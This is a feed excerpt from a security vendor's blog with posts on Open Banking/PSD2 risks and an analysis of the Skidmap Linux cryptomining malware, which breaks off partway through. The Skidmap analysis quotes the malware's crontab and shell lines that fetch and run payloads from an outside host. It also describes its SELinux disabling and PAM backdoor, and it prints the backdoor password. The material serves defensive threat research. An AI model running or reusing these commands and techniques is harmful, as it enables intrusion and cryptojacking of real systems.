<p>The post <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence/magecart-skimming-attack-targets-mobile-users-of-hotel-chain-booking-websites/">Magecart Skimming Attack Targets Mobile Users of Hotel Chain Booking Websites</a> appeared first on <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence"></a>.</p>
<div class="feedflare">
<a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=0dhQsbIZuEw:7hS8-ZQGsZo:yIl2AUoC8zA"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=0dhQsbIZuEw:7hS8-ZQGsZo:F7zBnMyn0Lo"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=0dhQsbIZuEw:7hS8-ZQGsZo:F7zBnMyn0Lo" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=0dhQsbIZuEw:7hS8-ZQGsZo:qj6IDK7rITs"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=0dhQsbIZuEw:7hS8-ZQGsZo:V_sGLiPBpWU"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=0dhQsbIZuEw:7hS8-ZQGsZo:V_sGLiPBpWU" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=0dhQsbIZuEw:7hS8-ZQGsZo:l6gmwiTKsz0"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=0dhQsbIZuEw:7hS8-ZQGsZo:gIN9vFwOqvQ"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=0dhQsbIZuEw:7hS8-ZQGsZo:gIN9vFwOqvQ" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=0dhQsbIZuEw:7hS8-ZQGsZo:TzevzKxY174"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174" border="0"></img></a>
</div><img src="http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/0dhQsbIZuEw" height="1" width="1" alt=""/>]]></content:encoded>
							<wfw:commentRss>https://blog.trendmicro.com/trendlabs-security-intelligence/magecart-skimming-attack-targets-mobile-users-of-hotel-chain-booking-websites/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
							<feedburner:origLink>https://blog.trendmicro.com/trendlabs-security-intelligence/magecart-skimming-attack-targets-mobile-users-of-hotel-chain-booking-websites/</feedburner:origLink></item>
		<item>
		<title>When PSD2 Opens More Doors: The Risks of Open Banking</title>
		<link>http://feeds.trendmicro.com/~r/Anti-MalwareBlog/~3/AytTGCjWBsk/</link>
				<comments>https://blog.trendmicro.com/trendlabs-security-intelligence/when-psd2-opens-more-doors-the-risks-of-open-banking/#respond</comments>
				<pubDate>Tue, 17 Sep 2019 12:05:14 +0000</pubDate>
		<dc:creator><![CDATA[Trend Micro Forward-Looking Threat Research Team]]></dc:creator>
				<category><![CDATA[Bad Sites]]></category>
		<category><![CDATA[Internet of Things]]></category>
		<category><![CDATA[Malware]]></category>
		<category><![CDATA[Mobile]]></category>
		<category><![CDATA[Ransomware]]></category>
		<category><![CDATA[Vulnerabilities]]></category>
		<category><![CDATA[Europe]]></category>
		<category><![CDATA[Open Banking]]></category>
		<category><![CDATA[PSD2]]></category>
		<category><![CDATA[research]]></category>

		<guid isPermaLink="false">https://blog.trendmicro.com/trendlabs-security-intelligence/?p=86063</guid>
				<description><![CDATA[<p>We looked into the security implications of the changing banking paradigm with PSD2 in place. Our research highlights the current and new risks that the financial industry will have to defend against, and predict how cybercriminals will abuse and attack Open Banking.</p>
<p>The post <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence/when-psd2-opens-more-doors-the-risks-of-open-banking/">When PSD2 Opens More Doors: The Risks of Open Banking</a> appeared first on <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence"></a>.</p>
]]></description>
								<content:encoded><![CDATA[<p><strong><em>By Feike Hacquebord, Robert McArdle, Fernando Merc</em></strong><strong><em>ês, and David Sancho</em></strong></p>
<p>As more industries adapt to cater to the increasingly mobile market, the financial industry is the latest to experience a shake-up. The Revised Payment Service Directive (PSD2) – also known as Open Banking – is a new set of rules for the European Union (EU) that&#8217;s expected to affect the global financial industry. The PSD2, implemented on September 14, 2019, was designed to replace the 2007 Payment Service Directive in the EU, but banks in the US and Asia have started making comparable adjustments to accommodate their customers as well.</p>
<p>Open Banking aims to inspire innovation and make banking transactions in the EU more cost-efficient, easier, and more secure. This entails banks opening their application programming interfaces (API) to financial technology (FinTech) companies to accommodate additional services such as financial recommendations and payment automation. Bank customers will have to give their explicit consent to these new companies to access their respective banking data.</p>
<p><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/figure-1-with-watermark-01.jpg"><img class="aligncenter wp-image-86067" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/figure-1-with-watermark-01.jpg" alt="" width="446" height="564" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/figure-1-with-watermark-01.jpg 1330w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/figure-1-with-watermark-01-158x200.jpg 158w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/figure-1-with-watermark-01-768x971.jpg 768w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/figure-1-with-watermark-01-810x1024.jpg 810w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/figure-1-with-watermark-01-640x809.jpg 640w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/figure-1-with-watermark-01-900x1138.jpg 900w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/figure-1-with-watermark-01-440x556.jpg 440w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/figure-1-with-watermark-01-380x481.jpg 380w" sizes="(max-width: 446px) 100vw, 446px" /></a></p>
<p style="text-align: center">Figure 1. With PSD2, new FinTech companies will launch new apps to aggregate banking data from multiple accounts.</p>
<p>PSD2 aims to make online banking more secure. To this end, PSD2 mandates two-factor authentication and “Dynamic Linking,” wherein an authentication code for each transaction is specific to the amount and the recipient. Additionally, banks in the UK are developing a standard called Financial grade API (FAPI), an extra layer of security in the authentication processes between new FinTech companies and banks.</p>
<p>This research paper looks into the PSD2-readiness of FinTech companies and banks from a security perspective and the new risks that could emerge when PSD2 comes into effect. Open Banking places customers&#8217; banking information into the hands of more parties, including new FinTech start-ups that may not have the same experience that the traditional banking industry has accumulated through years of addressing fraud. This inevitably implies that an increased attack surface. We found a few issues:</p>
<ul>
<li>Publicly accessible APIs of banks and FinTech companies will widen the attack surface.</li>
<li>Some (legacy) APIs and websites of banks and FinTech companies had sensitive customer information in their URLs. This is not in line with the intention of PSD2 to improve security of online banking.</li>
<li>Obsolete banking data sharing techniques are still in use.</li>
<li>Some mobile apps of banks and FinTech companies also connect to third parties like advertisers and app performance service companies.</li>
<li>More secure protocols, such as Financial grade API (FAPI), are still in development.</li>
</ul>
<p>&nbsp;</p>
<p><strong>API status quo and risks</strong></p>
<p>While European banks were considerably late in working with APIs in 2015, an increasing amount of banks worldwide uses APIs for data sharing.</p>
<p><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/banking-api-growth.jpg"><img class="aligncenter size-full wp-image-86065" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/banking-api-growth.jpg" alt="" width="2424" height="1374" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/banking-api-growth.jpg 2424w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/banking-api-growth-200x113.jpg 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/banking-api-growth-768x435.jpg 768w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/banking-api-growth-1024x580.jpg 1024w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/banking-api-growth-640x363.jpg 640w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/banking-api-growth-900x510.jpg 900w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/banking-api-growth-440x249.jpg 440w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/banking-api-growth-380x215.jpg 380w" sizes="(max-width: 2424px) 100vw, 2424px" /></a></p>
<p style="text-align: center">Figure 2. Growth trend of a particular subset of financial sector API hostnames, taken from Trend Micro’s Smart Protection Network (SPN)</p>
<p>Before PSD2 went into effect, we found security issues in the APIs used by a number of FinTech companies and banks. A significant number of banks – including at least two central banks in Europe and one central bank in Asia – were unintendedly exposing sensitive information such as authentication parameters, privacy-sensitive data, and transaction data in the URLs of APIs and (legacy) websites.</p>
<p><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/figure-3-with-watermark-01.jpg"><img class="aligncenter size-full wp-image-86068" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/figure-3-with-watermark-01.jpg" alt="" width="1517" height="863" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/figure-3-with-watermark-01.jpg 1517w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/figure-3-with-watermark-01-200x114.jpg 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/figure-3-with-watermark-01-768x437.jpg 768w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/figure-3-with-watermark-01-1024x583.jpg 1024w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/figure-3-with-watermark-01-640x364.jpg 640w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/figure-3-with-watermark-01-900x512.jpg 900w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/figure-3-with-watermark-01-440x250.jpg 440w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/figure-3-with-watermark-01-380x216.jpg 380w" sizes="(max-width: 1517px) 100vw, 1517px" /></a></p>
<p style="text-align: center">Figure 3. APIs exposing users’ sensitive information</p>
<p>Putting sensitive data in URLs is a bad practice, as these URLs might end up in log files, the browser history, and might even be shared between different devices of a user. Our research paper enumerates a small sample size of financial institutions from Europe, Asia, and the US exposing confidential information (the list has been anonymized to protect their respective customers).</p>
<p>We also found a European FinTech company that published its API documentation online, including authentication URLs that included the customer’s email address, password, client authentication, and client ID in the API URL.</p>
<p><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/Sept2019_OpenBanking_authenticate-a-user.png"><img class="aligncenter wp-image-86069" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/Sept2019_OpenBanking_authenticate-a-user.png" alt="" width="522" height="292" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/Sept2019_OpenBanking_authenticate-a-user.png 1297w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/Sept2019_OpenBanking_authenticate-a-user-200x112.png 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/Sept2019_OpenBanking_authenticate-a-user-768x429.png 768w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/Sept2019_OpenBanking_authenticate-a-user-1024x572.png 1024w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/Sept2019_OpenBanking_authenticate-a-user-640x358.png 640w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/Sept2019_OpenBanking_authenticate-a-user-900x503.png 900w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/Sept2019_OpenBanking_authenticate-a-user-440x246.png 440w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/Sept2019_OpenBanking_authenticate-a-user-380x212.png 380w" sizes="(max-width: 522px) 100vw, 522px" /></a></p>
<p style="text-align: center">Figure 4. A screenshot of the online documentation of a FinTech company’s API, claiming to be regulated by PSD2.  Sensitive information can be clearly seen in the API URL path.</p>
<p>&nbsp;</p>
<p><strong>Risky techniques: screen scraping</strong></p>
<p>A technique called “screen scraping” is among the techniques used by FinTech companies to aggregate bank data. This involves parsing through the HTML contents of a banking website by mimicking a web browser session using the customer’s login credentials. For this to work, the customer has to give his online banking password to the FinTech company, which is not advisable from a security point of view.</p>
<p>As PSD2 mandates that strict authentication is required, screen scraping should no longer be allowed and has to be replaced by OAuth2.0. FinTech companies organized to push back against this stipulation, saying that no known incidents or breaches related to the technique have occurred, and cite that OAuth is not user-friendly. A few weeks before the mandated September 14 implementation, authorities <a href="https://www.fca.org.uk/news/press-releases/fca-agrees-plan-phased-implementation-strong-customer-authentication">announced</a> a postponement in the full implementation of the technical security measures and fines in order to give third-party providers more time.</p>
<p>&nbsp;</p>
<p><strong>FAPI</strong></p>
<p>Financial grade API (FAPI) is a protocol intended to be secure even in high-risk scenarios. For example, if an attacker steals a mobile app user’s temporary access token, the attacker should not be able to use that token to access the victim’s financial data. FAPI is currently being developed by the OpenID Foundation and the U.K. Open Banking Implementation Entity. While intended for use once Open Banking takes effect in the U.K., it is not entirely ready; <a href="https://www.computer.org/csdl/proceedings-article/sp/2019/666000b054/19skg9V4UjS">FAPI reportedly still has issues</a> to resolve at the time of the research paper’s writing, including significant security flaws.</p>
<p>&nbsp;</p>
<p><strong>Predicting threats after PSD2 implementation</strong></p>
<p>This new banking paradigm, which involves open APIs with access to banking data, brings new opportunities for attackers. Below are just some of the threats and possible attack surfaces</p>
<ul>
<li><u>Attacks on the APIs</u>: Attacks on the APIs can result in distributed denial of service (DDoS), resulting in downtime for banking operations and transactions. A hacker can study how the API system works once it goes public and find unexpected responses and security flaws in the back end.</li>
<li><u>Attacks on FinTech companies</u>: Not all FinTech companies will have the same security level and experience that banks do. From a quick survey of these start-ups, they tend to be smaller and have no personnel dedicated to security, and can be subjected to an attacker pretending to be a legitimate bank or banking customer. Their servers can also be ideal targets to steal customers’ banking data.</li>
<li><u>Attacks against the user</u>: Old social engineering and phishing techniques will likely find traction against end users. Moreover, accountability and proving responsibility may become more complicated once a fraudulent transaction occurs.</li>
</ul>
<p>&nbsp;</p>
<p><strong>Conclusion and security recommendations</strong></p>
<p>While Open Banking promises better security and business opportunities for customers, banks and FinTech companies, the current implementations pose concerns from a security standpoint. The conflicting goals of FinTech companies eager to further innovation and services to the public, and banks trying to protect their established standing should not sacrifice the interests of the customers.</p>
<p>We recommend that FinTech companies embrace secure protocols and to stop using risky and outdated techniques. The lack of documented incidents are not equivalent to the fact that methods such as screen scraping are highly insecure. App developers should also make sure that their respective apps and websites are secure by design, and conceptualize applications that can run safely in a hostile and compromised environment.</p>
<p>Banks and other financial institutions should review their current apps’ APIs; sensitive information and personal data of customers should not be found on API URL paths as this could weaken or render established security measures useless.</p>
<p>For more risks and threats that we detailed and extensively discuss in the paper, download our research paper, “<a href="https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/the-risks-of-open-banking-are-banks-and-their-customers-ready-for-psd2">Ready or Not for PSD2: The Risks of Open Banking</a>.”</p>
<p><a href="https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/the-risks-of-open-banking-are-banks-and-their-customers-ready-for-psd2" target="_blank" rel="noopener noreferrer"><img style="width: 200px;margin: 0 auto" src="https://documents.trendmicro.com/images/TEx/articles/Risks of Open Banking Cover.jpg" alt="2" /> </a></p>
<p>The post <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence/when-psd2-opens-more-doors-the-risks-of-open-banking/">When PSD2 Opens More Doors: The Risks of Open Banking</a> appeared first on <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence"></a>.</p>
<div class="feedflare">
<a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=AytTGCjWBsk:AsvJJUf_fVs:yIl2AUoC8zA"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=AytTGCjWBsk:AsvJJUf_fVs:F7zBnMyn0Lo"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=AytTGCjWBsk:AsvJJUf_fVs:F7zBnMyn0Lo" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=AytTGCjWBsk:AsvJJUf_fVs:qj6IDK7rITs"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=AytTGCjWBsk:AsvJJUf_fVs:V_sGLiPBpWU"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=AytTGCjWBsk:AsvJJUf_fVs:V_sGLiPBpWU" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=AytTGCjWBsk:AsvJJUf_fVs:l6gmwiTKsz0"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=AytTGCjWBsk:AsvJJUf_fVs:gIN9vFwOqvQ"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=AytTGCjWBsk:AsvJJUf_fVs:gIN9vFwOqvQ" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=AytTGCjWBsk:AsvJJUf_fVs:TzevzKxY174"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174" border="0"></img></a>
</div><img src="http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/AytTGCjWBsk" height="1" width="1" alt=""/>]]></content:encoded>
							<wfw:commentRss>https://blog.trendmicro.com/trendlabs-security-intelligence/when-psd2-opens-more-doors-the-risks-of-open-banking/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
							<feedburner:origLink>https://blog.trendmicro.com/trendlabs-security-intelligence/when-psd2-opens-more-doors-the-risks-of-open-banking/</feedburner:origLink></item>
		<item>
		<title>Skidmap Linux Malware Uses Rootkit Capabilities to Hide Cryptocurrency-Mining Payload</title>
		<link>http://feeds.trendmicro.com/~r/Anti-MalwareBlog/~3/tQI97b4fF4Q/</link>
				<comments>https://blog.trendmicro.com/trendlabs-security-intelligence/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload/#respond</comments>
				<pubDate>Mon, 16 Sep 2019 12:10:39 +0000</pubDate>
		<dc:creator><![CDATA[Trend Micro]]></dc:creator>
				<category><![CDATA[Malware]]></category>
		<category><![CDATA[cryptocurrency miner]]></category>
		<category><![CDATA[Linux]]></category>
		<category><![CDATA[rootkit]]></category>
		<category><![CDATA[Skidmap]]></category>

		<guid isPermaLink="false">https://blog.trendmicro.com/trendlabs-security-intelligence/?p=85991</guid>
				<description><![CDATA[<img width="200" height="125" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-200x125.jpg" class="webfeedsFeaturedVisual wp-post-image" alt="" style="float: left; margin-right: 5px;" link_thumbnail="" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-200x125.jpg 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-768x480.jpg 768w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-1024x640.jpg 1024w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-640x400.jpg 640w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-900x563.jpg 900w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-440x275.jpg 440w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-380x238.jpg 380w" sizes="(max-width: 200px) 100vw, 200px" /><p>Skidmap, a Linux malware that we recently stumbled upon, demonstrates the increasing complexity of recent cryptocurrency-mining threats. This malware is notable because of the way it loads malicious kernel modules to keep its cryptocurrency mining operations under the radar.</p>
<p>These kernel-mode rootkits are not only more difficult to detect compared to its user-mode counterparts — attackers can also use them to gain unfettered access to the affected system. A case in point: the way Skidmap can also set up a secret master password that gives it access to any user account in the system. Conversely, given that many of Skidmap’s routines require root access, the attack vector that Skidmap uses — whether through exploits, misconfigurations, or exposure to the internet — are most likely the same ones that provide the attacker root or administrative access to the system.</p>
<p>The post <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload/">Skidmap Linux Malware Uses Rootkit Capabilities to Hide Cryptocurrency-Mining Payload</a> appeared first on <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence"></a>.</p>
]]></description>
								<content:encoded><![CDATA[<img width="200" height="125" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-200x125.jpg" class="webfeedsFeaturedVisual wp-post-image" alt="" style="float: left; margin-right: 5px;" link_thumbnail="" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-200x125.jpg 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-768x480.jpg 768w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-1024x640.jpg 1024w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-640x400.jpg 640w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-900x563.jpg 900w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-440x275.jpg 440w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-380x238.jpg 380w" sizes="(max-width: 200px) 100vw, 200px" /><p><strong><em>By Augusto Remillano II and Jakub Urbanec (Threat Analysts) </em></strong></p>
<p><a href="https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/security-101-the-impact-of-cryptocurrency-mining-malware">Cryptocurrency-mining malware</a> is still a prevalent threat, as illustrated by our detections of this threat in the <a href="https://www.trendmicro.com/vinfo/us/security/research-and-analysis/threat-reports/roundup/evasive-threats-pervasive-effects">first half of 2019</a>. Cybercriminals, too, increasingly explored new platforms and ways to further cash in on their malware — from <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/cryptocurrency-mining-botnet-arrives-through-adb-and-spreads-through-ssh/">mobile devices</a> and Unix and <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/golang-based-spreader-used-in-a-cryptocurrency-mining-malware-campaign/">Unix-like systems</a> to <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/cryptocurrency-miner-distributed-via-php-weathermap-vulnerability-targets-linux-servers/">servers</a> and <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/infected-cryptocurrency-mining-containers-target-docker-hosts-with-exposed-apis-use-shodan-to-find-additional-victims/">cloud environments</a>.</p>
<p>They also constantly hone their malware’s resilience against detection. Some, for instance, <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/cve-2019-2725-exploited-and-certificate-files-used-for-obfuscation-to-deliver-monero-miner/">bundle</a> their malware with a watchdog component that ensures that the illicit cryptocurrency mining activities persist in the infected machine, while others, affecting Linux-based systems, <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/cve-2019-3396-redux-confluence-vulnerability-exploited-to-deliver-cryptocurrency-miner-with-rootkit/">utilize</a> an LD_PRELOAD-based userland <a href="https://www.trendmicro.com/vinfo/us/security/definition/rootkit">rootkit</a> to make their components undetectable by system monitoring tools.</p>
<p>Skidmap, a Linux malware that we recently stumbled upon, demonstrates the increasing complexity of recent cryptocurrency-mining threats. This malware is notable because of the way it loads malicious kernel modules to keep its cryptocurrency mining operations under the radar.</p>
<p>These kernel-mode rootkits are not only more difficult to detect compared to its user-mode counterparts — attackers can also use them to gain unfettered access to the affected system. A case in point: the way Skidmap can also set up a secret master password that gives it access to any user account in the system. Conversely, given that many of Skidmap’s routines require root access, the attack vector that Skidmap uses — whether through exploits, misconfigurations, or exposure to the internet — are most likely the same ones that provide the attacker root or administrative access to the system.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-1.jpg"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-1.jpg" alt="" width="400" /></a><br />
Figure 1. Skidmap’s infection chain</p>
<h3><strong>Skidmap’s infection chain</strong></h3>
<p>The malware installs itself via crontab (list of commands that are run on a regular schedule) to its target machine, as shown below:</p>
<pre>*/1 * * * * curl -fsSL hxxp://pm[.]ipfswallet[.]tk/pm.sh | sh</pre>
<p>The installation script <em>pm.sh</em> then downloads the main binary “pc” (detected by Trend Micro as Trojan.Linux.SKIDMAP.UWEJX):</p>
<pre>if [ -x "/usr/bin/wget"  -o  -x "/bin/wget" ]; then
   wget -c hxxp://pm[.]ipfswallet[.]tk/pc -O /var/lib/pc &amp;&amp; chmod +x /var/lib/pc &amp;&amp; /var/lib/pc elif [ -x "/usr/bin/curl"  -o  -x "/bin/curl" ]; then
   curl -fs hxxp://pm[.]ipfswallet[.]tk/pc -o /var/lib/pc &amp;&amp; chmod +x /var/lib/pc &amp;&amp; /var/lib/pc elif [ -x "/usr/bin/get"  -o  -x "/bin/get" ]; then
   get -c hxxp://pm[.]ipfswallet[.]tk/pc -O /var/lib/pc &amp;&amp; chmod +x /var/lib/pc &amp;&amp; /var/lib/pc elif [ -x "/usr/bin/cur"  -o  -x "/bin/cur" ]; then
   cur -fs hxxp://pm[.]ipfswallet[.]tk/pc -o /var/lib/pc &amp;&amp; chmod +x /var/lib/pc &amp;&amp; /var/lib/pc else
   url -fs hxxp://pm[.]ipfswallet[.]tk/pc -o /var/lib/pc &amp;&amp; chmod +x /var/lib/pc &amp;&amp; /var/lib/pc fi</pre>
<p>Upon execution of the “pc” binary, it will decrease the affected machine’s security settings. If the file <em>/usr/sbin/setenforce</em> exists, the malware executes the command, setenforce 0. This command configures the system’s Security-Enhanced Linux (SELinux) module, which provides support in the system&#8217;s access control policies, into permissive mode — that is, setting the SELinux policy so that it is not enforced. If the system has the <em>/etc/selinux/config</em> file, it will write these commands into the file: SELINUX=disabled and SELINUXTYPE=targeted commands. The former disables the SELinux policy (or disallows one to be loaded), while the latter sets selected processes to run in confined domains.</p>
<p>Skidmap also sets up a way to gain backdoor access to the machine. It does this by having the binary add the public key of its handlers to the <em>authorized_keys</em> file, which contains keys needed for authentication.</p>
<p>Besides the backdoor access, Skidmap also creates another way for its operators to gain access to the machine. The malware replaces the system’s <em>pam_unix.so</em> file (the module responsible for standard Unix authentication) with its own malicious version (detected as Backdoor.Linux.PAMDOR.A). As shown in Figure 2, this malicious <em>pam_unix.so</em> file accepts a specific password for any users, thus allowing the attackers to log in as any user in the machine.</p>
<p align="center"><a href="//blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-2-1.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-2-1.png" alt="" width="300" /></a></p>
<p align="center"><a href="//blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-2-2.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-2-2.png" alt="" width="300" /></a><br />
Figure 2. Code snippets showing how Skidmap gets its backdoor access to the affected system (top) and how it uses a malicious version of the <em>pam_unix.so</em> file to gain access to the machine (bottom; the password that it uses and accepts is Mtm$%889*G*S3%G)</p>
<h3><strong>How Skidmap drops the cryptocurrency miner </strong></h3>
<p>The “pc” binary checks whether the infected system’s OS is Debian or RHEL/CentOS. Its routine, which involves dropping the cryptocurrency miner and other components, depends on OS. For Debian-based systems, it drops the cryptocurrency miner payload to <em>/tmp/miner2</em>. For CentOS/RHEL systems, it will download a tar (tape archive) file from the URL, hxxp://pm[.]ipfswallet[.]tk/cos7[.]tar[.]gz, containing the cryptocurrency miner and its multiple components, which is unpacked and then installed. Of note is that the content of the tar file is decrypted via OpenSSL with the key “jcx@076” using Triple DES cipher.</p>
<p align="center"><a href="//blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-3-1.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-3-1.png" alt="" width="300" /></a></p>
<p align="center"><a href="//blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-3-2.png"><img class="aligncenter size-full wp-image-85996" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-3-2.png" alt="" width="300" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-3-2.png 450w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-3-2-200x172.png 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-3-2-440x377.png 440w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-3-2-380x326.png 380w" sizes="(max-width: 450px) 100vw, 450px" /></a><br />
Figure 3. How the “pc” binary drops the cryptocurrency miner in Debian- (top) and CentOS/RHEL-based systems (bottom)</p>
<h3><strong>Skidmap’s other malicious components</strong></h3>
<p>The malware has notable components that are meant to further obfuscate its malicious activities and ensure that they continue to run:</p>
<ul>
